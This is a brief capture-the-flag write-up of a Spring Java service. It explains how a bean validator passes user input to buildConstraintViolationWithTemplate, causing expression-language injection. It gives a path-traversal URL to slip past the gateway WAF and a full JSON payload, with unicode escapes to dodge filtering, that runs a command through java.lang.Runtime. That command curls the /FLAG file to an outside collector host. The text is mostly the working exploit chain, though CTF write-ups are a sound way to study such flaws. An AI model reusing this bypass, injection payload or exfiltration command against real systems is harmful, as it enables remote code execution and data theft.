```
@RequestMapping({"/api/internal"})
public class InternalController extends BaseController {
  private static final Logger log = LoggerFactory.getLogger(me.line.ctf.controller.InternalController.class);
  
  @PostMapping({"/"})
  public String index(@ValidateName @RequestBody RequestDto name) {
    log.info("{} is here !", name);
    return "Welcome " + name.getName() + "!";
  }
}
```
```
public boolean isValid(String value, ConstraintValidatorContext context) {
    if (StringUtils.isEmpty(value) || PATTERN.matcher(value).matches())
      return true; 
    context.buildConstraintViolationWithTemplate(
        String.format("%s", new Object[] { value })).addConstraintViolation();
    return false;
  }
```
+ /api/internalWhen the validator for the Name parameter operates in the internalController that is executed when accessing the path, EL Template injection occurs using context.buildConstraintViolationWithTemplate.

+ In order to access that path, you need to bypass the WAF that exists in gw, which ;can be bypassed using 
`http://35.200.117.55:20080/api/external/..;/internal;/`
+ Since there is no sandbox in the template engine, commnd can be executed using the java.lang.Runtime class.
`{"name":"${''.getClass().forName('java.lang.Runtim\u0065').getM\u0065thods()[6].invok\u0065(''.getClass().forName('java.lang.Runtim\u0065')).\u0065xec('curl https://enllwt2ugqrt.x.pipedream.net/ -F=@/FLAG')}"}`
